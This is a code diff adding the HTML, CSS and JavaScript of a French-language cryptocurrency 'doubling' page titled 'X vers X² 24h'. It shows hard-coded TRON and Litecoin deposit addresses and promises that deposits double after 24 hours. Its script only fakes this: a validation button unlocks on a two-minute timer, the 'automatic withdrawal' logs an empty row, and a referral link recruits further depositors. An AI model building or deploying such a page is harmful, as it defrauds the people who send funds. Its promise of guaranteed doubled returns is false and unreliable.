+      background-color: #00ffcc;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 1.09em;
+      cursor: pointer;
+      box-shadow: 0 0 10px #00ffcc;
+      margin-bottom: 10px;
+      color: #203a43;
+    }
+    .section {
+      margin-top: 20px;
+      text-align: left;
+      width: 100%;
+      min-width: 0;
+    }
+    .section h3 {
+      color: #00ffcc;
+      margin-bottom: 10px;
+      text-align: left;
+      font-size: 1.18em;
+      font-weight: bold;
+    }
+    .section ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    .section li {
+      background: rgba(0,0,0,0.25);
+      margin: 5px 0;
+      padding: 12px 0 12px 0;
+      border-radius: 8px;
+      font-size: 1em;
+    }
+    .ref-link {
+      background: rgba(0,0,0,0.3);
+      padding: 10px;
+      border-radius: 8px;
+      margin-top: 10px;
+      word-break: break-word;
+      font-size: 0.97em;
+    }
+    .qr-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+      justify-content: left;
+      width: 100%;
+    }
+    .qr-row img {
+      width: 48px;
+      height: 48px;
+      border-radius: 6px;
+      background: #fff;
+      padding: 2px;
+      border: 1px solid #00ffcc;
+    }
+    .depot-adresses {
+      margin-top: 18px;
+      margin-bottom: 10px;
+      animation: fadein 0.6s;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      min-width: 0;
+    }
+    .depot-cadre {
+      background: rgba(0,255,204,0.14);
+      border: 2px solid #00ffcc;
+      border-radius: 15px;
+      padding: 22px 6vw;
+      margin-top: 8px;
+      margin-bottom: 8px;
+      min-width: 0;
+      box-shadow: 0 0 10px #00ffcc33;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      font-size: 1.07em;
+      justify-content: center;
+    }
+    .depot-cadre strong {
+      color: #00ffcc;
+      font-size: 1.18em;
+      margin-bottom: 10px;
+      letter-spacing: 1px;
+      font-weight: bold;
+      text-align: center;
+      width: 100%;
+    }
+    .depot-details {
+      background: transparent;
+      width: 100%;
+      margin-top: 9px;
+      margin-bottom: 5px;
+      font-size: 1.07em;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+    }
+    .depot-details-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 8px;
+      background: rgba(0,0,0,0.09);
+      border-radius: 8px;
+      overflow: hidden;
+      text-align: center;
+    }
+    .depot-details-table th, .depot-details-table td {
+      padding: 7px 4px;
+      text-align: center;
+      font-size: 1.07em;
+      border-bottom: 1px solid #00ffcc44;
+    }
+    .depot-details-table th {
+      background: #00ffcc18;
+      color: #00ffcc;
+      font-weight: bold;
+      letter-spacing: 0.5px;
+    }
+    .depot-details-table td {
+      color: #fff;
+      font-weight: bold;
+    }
+    .white-num {
+      color: #fff !important;
+      font-weight: 900;
+      letter-spacing: 1px;
+      font-size: 1.12em;
+    }
+    .crypto-choice {
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+      margin-bottom: 10px;
+    }
+    .crypto-choice label {
+      font-weight: bold;
+      color: #00ffcc;
+      cursor: pointer;
+      font-size: 1.09em;
+    }
+    .montant-converti {
+      margin: 10px 0;
+      font-size: 1.07em;
+      color: #fff;
+      font-weight: bold;
+    }
+    .transaction-gain {
+      margin-top: 12px;
+      background: rgba(0,0,0,0.13);
+      border-radius: 10px;
+      padding: 10px 0;
+      font-size: 1.12em;
+      color: #00ffcc;
+      font-weight: bold;
+    }
+    .transaction-status {
+      margin-top: 12px;
+      border-radius: 8px;
+      padding: 9px 0;
+      font-size: 1em;
+      font-weight: bold;
+      width: 100%;
+      transition: background 0.3s, color 0.3s;
+    }
+    .status-attente {
+      background: #ffc107;
+      color: #333;
+      border: 1.5px solid #e9a700;
+    }
+    .status-valide {
+      background: #22e222;
+      color: #fff;
+      border: 1.5px solid #13b613;
+    }
+    .confirmation-texte {
+      margin-top: 10px;
+      color: #fff;
+      font-style: italic;
+      font-size: 1em;
+      background: rgba(0,0,0,0.10);
+      border-radius: 8px;
+      padding: 8px;
+    }
+    .transaction-tableau {
+      margin-top: 14px;
+      width: 100%;
+      border-collapse: collapse;
+      background: rgba(0,0,0,0.10);
+      border-radius: 12px;
+      overflow: hidden;
+      font-size: 0.97em;
+      min-width: 0;
+    }
+    .transaction-tableau th {
+      background: #00ffcc;
+      color: #203a43;
+      padding: 7px 3px;
+      font-weight: bold;
+      border-bottom: 1.5px solid #00ffcc;
+    }
+    .transaction-tableau td {
+      padding: 7px 3px;
+      border-bottom: 1px solid #0f2027;
+    }
+    .gain-doubled {
+      color: #22e222;
+      font-weight: bold;
+      background: rgba(34,226,34,0.07);
+      border-radius: 7px;
+      padding: 4px 0;
+      font-size: 0.98em;
+      margin-top: 2px;
+    }
+    .message-jaune {
+      background: #fff6d1;
+      color: #a87b00;
+      border: 2px solid #ffe58f;
+      border-radius: 9px;
+      padding: 11px 14px 11px 14px;
+      margin: 16px auto 6px auto;
+      font-size: 1em;
+      font-weight: bold;
+      max-width: 350px;
+      position: relative;
+      box-shadow: 0 0 10px #ffe58f55;
+      text-align: left;
+      display: none;
+      align-items: center;
+      justify-content: space-between;
+      z-index: 100;
+      animation: shake 1s cubic-bezier(.36,.07,.19,.97) 2;
+    }
+    @keyframes shake {
+      10%, 90% { transform: translateX(-2px); }
+      20%, 80% { transform: translateX(4px); }
+      30%, 50%, 70% { transform: translateX(-6px); }
+      40%, 60% { transform: translateX(6px); }
+      100% { transform: translateX(0);}
+    }
+    .close-message {
+      background: none;
+      border: none;
+      font-size: 1.2em;
+      font-weight: bold;
+      color: #a87b00;
+      cursor: pointer;
+      margin-left: 18px;
+      margin-right: -7px;
+    }
+    .disabled-btn {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    @keyframes fadein {
+      0% { opacity: 0;}
+      100% { opacity: 1;}
+    }
+    @media screen and (max-width: 600px) {
+      .box {
+        max-width: 99vw;
+        margin: 0 0 15px 0;
+        padding: 8vw 2vw 20vw 2vw;
+      }
+      #loginBox {
+        max-width: 99vw;
+        margin-top: 10vw;
+        margin-bottom: 10vw;
+        padding: 15vw 2vw 15vw 2vw;
+      }
+      .depot-cadre {
+        padding: 18px 1vw;
+      }
+      .depot-details-table th, .depot-details-table td {
+        padding: 6px 2px;
+        font-size: 0.98em;
+      }
+      .section h3 { font-size: 1.09em; }
+      .crypto-choice label { font-size: 1em;}
+      button:not(.retour-btn) { font-size: 1em; }
+      input[type="text"], input[type="number"] { font-size: 1em;}
+    }
+    @media screen and (max-width: 400px) {
+      .box { padding: 5px 0 13vw 0; }
+      #loginBox { padding: 10vw 1vw 12vw 1vw;}
+      .depot-cadre { padding: 8px 1vw;}
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="title-3d">X vers X² 24h</div>
+</header>
+
+<div class="box" id="loginBox">
+  <button class="retour-btn" style="display:none;" id="retourLogin" onclick="showPage('loginBox')">&larr; Retour</button>
+  <h2 style="margin-bottom:23px;">Connectez-vous avec votre adresse TRX ou LTC</h2>
+  <input type="text" id="cryptoAddress" placeholder="Saisissez votre adresse TRX ou LTC" style="max-width:340px; width:93%; font-size:1.18em; padding:15px; margin-bottom:18px;">
+  <button style="max-width:340px; width:93%; font-size:1.13em; margin-bottom:12px;" onclick="validateAddress()">Connexion</button>
+  <p id="error" style="color: red; font-size:1.08em; margin:8px 0 0 0;"></p>
+</div>
+
+<div class="box" id="dashboard" style="display:none;">
+  <button class="retour-btn" id="retourDashboard" onclick="showPage('loginBox')">&larr; Retour</button>
+  <h2>Tableau de bord</h2>
+
+  <div class="section">
+    <h3>Menu</h3>
+    <ul>
+      <li>
+        <div class="crypto-choice">
+          <label>
+            <input type="radio" name="cryptoType" value="TRX" checked onchange="updateMontantLabel()"> TRX
+          </label>
+          <label>
+            <input type="radio" name="cryptoType" value="LTC" onchange="updateMontantLabel()"> LTC
+          </label>
+        </div>
+        <div id="montantLabel" class="label-gras">Montant en TRX :</div>
+        <input type="number" id="depositInput" class="input-amount" placeholder="Entrez le montant">
+        <button onclick="doDeposit()">Valider</button>
+        <p id="depositError" style="color: red;"></p>
+        <div id="montantConverti" class="montant-converti" style="display:none;"></div>
+        <div id="depotAdresses" class="depot-adresses" style="display:none;">
+          <!-- Cadre complet détails dépot -->
+          <div id="depotCadreTrx" class="depot-cadre" style="display:none;">
+            <strong>Adresse de dépôt TRON (TRX)</strong>
+            <div class="qr-row">
+              <img src="https://api.qrserver.com/v1/create-qr-code/?data=TP32k5jeCVvUTFLisi6mvTJk7k9sEj84aE&amp;size=60x60" alt="QR TRON">
+              <span style="color:#00ffcc; font-weight:bold;">TP32k5jeCVvUTFLisi6mvTJk7k9sEj84aE</span>
+            </div>
+            <div class="depot-details">
+              <table class="depot-details-table">
+                <tr>
+                  <th>Date & Heure</th>
+                  <td class="white-num" id="detailDateTrx">-</td>
+                </tr>
+                <tr>
+                  <th>Montant déposé</th>
+                  <td class="white-num" id="detailMontantTrx">-</td>
+                </tr>
+                <tr>
+                  <th>Gain doublé après 24h</th>
+                  <td class="white-num" id="detailGainTrx">-</td>
+                </tr>
+                <tr>
+                  <th>Statut</th>
+                  <td id="detailStatutTrx">En attente</td>
+                </tr>
+              </table>
+            </div>
+          </div>
+          <div id="depotCadreLtc" class="depot-cadre" style="display:none;">
+            <strong>Adresse de dépôt LTC</strong>
+            <div class="qr-row">
+              <img src="https://api.qrserver.com/v1/create-qr-code/?data=ltc1qd2332k7lc4anqsfvux0fgeu4h9q3j3wgrlaa7t&amp;size=60x60" alt="QR LTC">
+              <span style="color:#00ffcc; font-weight:bold;">ltc1qd2332k7lc4anqsfvux0fgeu4h9q3j3wgrlaa7t</span>
+            </div>
+            <div class="depot-details">
+              <table class="depot-details-table">
+                <tr>
+                  <th>Date & Heure</th>
+                  <td class="white-num" id="detailDateLtc">-</td>
+                </tr>
+                <tr>
+                  <th>Montant déposé</th>
+                  <td class="white-num" id="detailMontantLtc">-</td>
+                </tr>
+                <tr>
+                  <th>Gain doublé après 24h</th>
+                  <td class="white-num" id="detailGainLtc">-</td>
+                </tr>
+                <tr>
+                  <th>Statut</th>
+                  <td id="detailStatutLtc">En attente</td>
+                </tr>
+              </table>
+            </div>
+          </div>
+        </div>
+        <div id="transactionGain" class="transaction-gain" style="display:none;"></div>
+        <div id="transactionStatus" class="transaction-status status-attente" style="display:none;">En attente</div>
+        <button id="btnValiderTransaction" style="display:none;margin-top:10px;background:#22e222;color:#fff;" onclick="validerTransaction()" class="disabled-btn" disabled>Valider la transaction</button>
+      </li>
+      <li style="font-size:1em; color:#00ffcc;">
+        <b>Retrait :</b> Toutes les 24h après votre dépôt, le retrait automatique est effectué.
+      </li>
+      <li>
+        <div style="margin-top:14px;">
+          <table id="transactionTableau" class="transaction-tableau" style="width:100%;margin-bottom:0;">
+            <thead>
+              <tr>
+                <th>Date</th>
+                <th>Type</th>
+                <th>Montant</th>
+                <th>Gain doublé après 24h</th>
+                <th>Statut</th>
+              </tr>
+            </thead>
+            <tbody>
+              <!-- transactions dynamiques ici -->
+            </tbody>
+          </table>
+        </div>
+      </li>
+    </ul>
+    <div id="messageJaune" class="message-jaune" style="display:none;">
+      <span id="messageContentJaune">
+        En attente de votre transfert. Veuillez patienter et ne fermez pas la page.
+      </span>
+      <button class="close-message" onclick="closeMessageJaune()" title="Fermer">&times;</button>
+    </div>
+  </div>
+
+  <div class="section">
+    <h3>Parrainage</h3>
+    <ul>
+      <li>Commission parrainage : <strong id="commission">0.00</strong></li>
+      <li>Nombre de filleuls : <strong id="refCount">0</strong></li>
+    </ul>
+    <div class="ref-link">
+      Lien de parrainage : <span id="refLink"></span>
+    </div>
+  </div>
+</div>
+
+<script>
+  let currentAddress = '';
+  let depositTotal = 0;
+  let lastPage = "loginBox";
+  let transactionStatus = "attente";
+  let transactions = [];
+  let validerTimeout = null;
+  let messageJauneVisible = false;
+
+  let coursTrxToLtc = 0.002;
+  let coursLtcToTrx = 500;
+
+  function showPage(pageId) {
+    document.getElementById('loginBox').style.display = "none";
+    document.getElementById('dashboard').style.display = "none";
+    document.getElementById(pageId).style.display = "block";
+    document.getElementById('retourLogin').style.display = pageId !== "loginBox" ? "inline-block" : "none";
+    document.getElementById('retourDashboard').style.display = pageId !== "dashboard" ? "inline-block" : "none";
+    lastPage = pageId;
+  }
+
+  function validateAddress() {
+    const address = document.getElementById('cryptoAddress').value.trim();
+    const error = document.getElementById('error');
+    const refLink = document.getElementById('refLink');
+    const ltcRegex = /^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$|^ltc1[a-zA-HJ-NP-Z0-9]{39,59}$/;
+    const trxRegex = /^T[a-zA-Z0-9]{33}$/;
+
+    if (ltcRegex.test(address) || trxRegex.test(address)) {
+      error.textContent = '';
+      showPage('dashboard');
+      // *** Correction ici pour le lien de parrainage ***
+      refLink.textContent = 'https://xto2x.netlify.app/?ref=' + address;
+      currentAddress = address;
+      localStorage.setItem("savedAddress", address);
+      autoRetraitIfDue();
+      renderTransactions();
+    } else {
+      error.textContent = 'Adresse invalide. Seules les adresses TRX ou LTC sont acceptées.';
+    }
+  }
+
+  function updateMontantLabel() {
+    const type = getCryptoType();
+    const label = document.getElementById('montantLabel');
+    document.getElementById('depositInput').value = "";
+    document.getElementById('montantConverti').style.display = "none";
+    document.getElementById('depotAdresses').style.display = "none";
+    document.getElementById('depotCadreTrx').style.display = "none";
+    document.getElementById('depotCadreLtc').style.display = "none";
+    document.getElementById('transactionGain').style.display = "none";
+    document.getElementById('transactionStatus').style.display = "none";
+    document.getElementById('btnValiderTransaction').style.display = "none";
+    document.getElementById('messageJaune').style.display = "none";
+    messageJauneVisible = false;
+    if (validerTimeout) clearTimeout(validerTimeout);
+    document.getElementById('btnValiderTransaction').disabled = true;
+    document.getElementById('btnValiderTransaction').classList.add('disabled-btn');
+    if (type === "TRX") {
+      label.textContent = "Montant en TRX :";
+    } else {
+      label.textContent = "Montant en LTC :";
+    }
+    label.className = "label-gras";
+  }
+
+  function getCryptoType() {
+    const radios = document.getElementsByName('cryptoType');
+    for (let i = 0; i < radios.length; i++) {
+      if (radios[i].checked) return radios[i].value;
+    }
+    return "TRX";
+  }
+
+  function doDeposit() {
+    const input = parseFloat(document.getElementById('depositInput').value);
+    const depositError = document.getElementById('depositError');
+    const commission = document.getElementById('commission');
+    const depotAdresses = document.getElementById('depotAdresses');
+    const montantConverti = document.getElementById('montantConverti');
+    const transactionGain = document.getElementById('transactionGain');
+    const transactionStatusDiv = document.getElementById('transactionStatus');
+    const btnValiderTransaction = document.getElementById('btnValiderTransaction');
+    const type = getCryptoType();
+    const depotCadreTrx = document.getElementById('depotCadreTrx');
+    const depotCadreLtc = document.getElementById('depotCadreLtc');
+    const messageJaune = document.getElementById('messageJaune');
+
+    const minTRX = 3;
+    const minLTC = 0.002;
+
+    let isValid = false;
+    let montantTrx = 0, montantLtc = 0;
+
+    if (type === "TRX") {
+      if (input >= minTRX) {
+        isValid = true;
+        montantTrx = input;
+        montantLtc = input * coursTrxToLtc;
+      }
+    } else {
+      if (input >= minLTC) {
+        isValid = true;
+        montantLtc = input;
+        montantTrx = input * coursLtcToTrx;
+      }
+    }
+
+    commission.textContent = "0.00";
+
+    if (isValid) {
+      depositError.textContent = '';
+      depositTotal += (type === "TRX" ? montantTrx : montantLtc * coursLtcToTrx);
+      montantConverti.style.display = "block";
+      montantConverti.innerHTML =
+        `Montant converti : <span class="white-num">${montantTrx.toFixed(3)} TRX</span> &nbsp;|&nbsp; <span class="white-num">${montantLtc.toFixed(3)} LTC</span>`;
+      depotAdresses.style.display = 'flex';
+
+      // Show and fill details in the cadre
+      let now = new Date();
+      let dateStr = now.toLocaleDateString() + " " + now.toLocaleTimeString().slice(0,5);
+      let montantDepot = (type === "TRX" ? montantTrx : montantLtc);
+      let gainDouble = (montantDepot * 2).toFixed(3) + " " + type;
+      let statutTxt = "En attente";
+      if (type === "TRX") {
+        depotCadreTrx.style.display = "flex";
+        depotCadreLtc.style.display = "none";
+        document.getElementById('detailDateTrx').textContent = dateStr;
+        document.getElementById('detailMontantTrx').textContent = montantTrx.toFixed(3) + " TRX";
+        document.getElementById('detailGainTrx').textContent = gainDouble;
+        document.getElementById('detailStatutTrx').textContent = statutTxt;
+        transactionGain.innerHTML = `Votre gain dans 24h : <span class="white-num">${gainDouble}</span> (100% du dépôt ajouté)`;
+      } else {
+        depotCadreTrx.style.display = "none";
+        depotCadreLtc.style.display = "flex";
+        document.getElementById('detailDateLtc').textContent = dateStr;
+        document.getElementById('detailMontantLtc').textContent = montantLtc.toFixed(3) + " LTC";
+        document.getElementById('detailGainLtc').textContent = gainDouble;
+        document.getElementById('detailStatutLtc').textContent = statutTxt;
+        transactionGain.innerHTML = `Votre gain dans 24h : <span class="white-num">${gainDouble}</span> (100% du dépôt ajouté)`;
+      }
+      transactionGain.style.display = "block";
+      transactionStatus = "attente";
+      transactionStatusDiv.textContent = "En attente";
+      transactionStatusDiv.className = "transaction-status status-attente";
+      transactionStatusDiv.style.display = "block";
+      btnValiderTransaction.style.display = "block";
+      btnValiderTransaction.disabled = true;
+      btnValiderTransaction.classList.add('disabled-btn');
+
+      if (validerTimeout) clearTimeout(validerTimeout);
+      validerTimeout = setTimeout(function() {
+        btnValiderTransaction.disabled = false;
+        btnValiderTransaction.classList.remove('disabled-btn');
+      }, 120000);
+
+      // Ajout du gain doublé après 24h au tableau
+      transactions.push({
+        date: dateStr,
+        type: "Dépot",
+        montant: type === "TRX" ? montantTrx.toFixed(3) + " TRX" : montantLtc.toFixed(3) + " LTC",
+        gain: gainDouble,
+        status: "En attente"
+      });
+      renderTransactions();
+
+      // Effet shake pour le message jaune
+      messageJaune.style.display = "flex";
+      messageJaune.classList.remove("shake-animate");
+      void messageJaune.offsetWidth;
+      messageJaune.classList.add("shake-animate");
+      document.getElementById('messageContentJaune').textContent = "En attente de votre transfert. Veuillez patienter et ne fermez pas la page.";
+      messageJauneVisible = true;
+    } else {
+      depositError.textContent = 'Dépôt minimum : 3 TRX ou 0.002 LTC';
+      montantConverti.style.display = "none";
+      depotAdresses.style.display = 'none';
+      depotCadreTrx.style.display = "none";
+      depotCadreLtc.style.display = "none";
+      transactionGain.style.display = "none";
+      transactionStatusDiv.style.display = "none";
+      btnValiderTransaction.style.display = "none";
+      messageJaune.style.display = "none";
+      messageJauneVisible = false;
+      if (validerTimeout) clearTimeout(validerTimeout);
+      btnValiderTransaction.disabled = true;
+      btnValiderTransaction.classList.add('disabled-btn');
+    }
+  }
+
+  function validerTransaction() {
+    const transactionStatusDiv = document.getElementById('transactionStatus');
+    transactionStatus = "valide";
+    transactionStatusDiv.textContent = "Validé";
+    transactionStatusDiv.className = "transaction-status status-valide";
+    document.getElementById('btnValiderTransaction').style.display = "none";
+    if (getCryptoType() === "TRX") {
+      document.getElementById('detailStatutTrx').textContent = "Validé";
+    } else {
+      document.getElementById('detailStatutLtc').textContent = "Validé";
+    }
+    if (transactions.length > 0) {
+      transactions[transactions.length-1].status = "Validé";
+      renderTransactions();
+    }
+    if (validerTimeout) clearTimeout(validerTimeout);
+  }
+
+  function closeMessageJaune() {
+    document.getElementById('messageJaune').style.display = "none";
+    messageJauneVisible = false;
+  }
+
+  function renderTransactions() {
+    const tbody = document.querySelector("#transactionTableau tbody");
+    tbody.innerHTML = "";
+    transactions.forEach(function(tx) {
+      let color = tx.status === "En attente" ? "#ffc107" : "#22e222";
+      let txtColor = tx.status === "En attente" ? "#333" : "#fff";
+      let gainCell = `<span class="gain-doubled">${tx.gain || "-"}</span>`;
+      let montantCell = `<span class="white-num">${tx.montant}</span>`;
+      tbody.innerHTML += `<tr>
+        <td>${tx.date}</td>
+        <td>${tx.type}</td>
+        <td>${montantCell}</td>
+        <td>${gainCell}</td>
+        <td style="background:${color};color:${txtColor};border-radius:8px;font-weight:bold;text-align:center;">${tx.status}</td>
+      </tr>`;
+    });
+  }
+
+  function doWithdraw() {
+    let now = new Date();
+    let dateStr = now.toLocaleDateString() + " " + now.toLocaleTimeString().slice(0,5);
+    transactions.push({
+      date: dateStr,
+      type: "Retrait",
+      montant: "-",
+      gain: "-",
+      status: "Validé"
+    });
+    renderTransactions();
+    depositTotal = 0;
+  }
+
+  function autoRetraitIfDue() {
+    const lastRetrait = localStorage.getItem("lastRetrait");
+    const now = Date.now();
+    const oneDay = 24 * 60 * 60 * 1000;
+    if (!lastRetrait || now - parseInt(lastRetrait) >= oneDay) {
+      doWithdraw();
+      localStorage.setItem("lastRetrait", now.toString());
+    }
+  }
+
+  showPage('loginBox');
+</script>
+
 </body>
 </html>
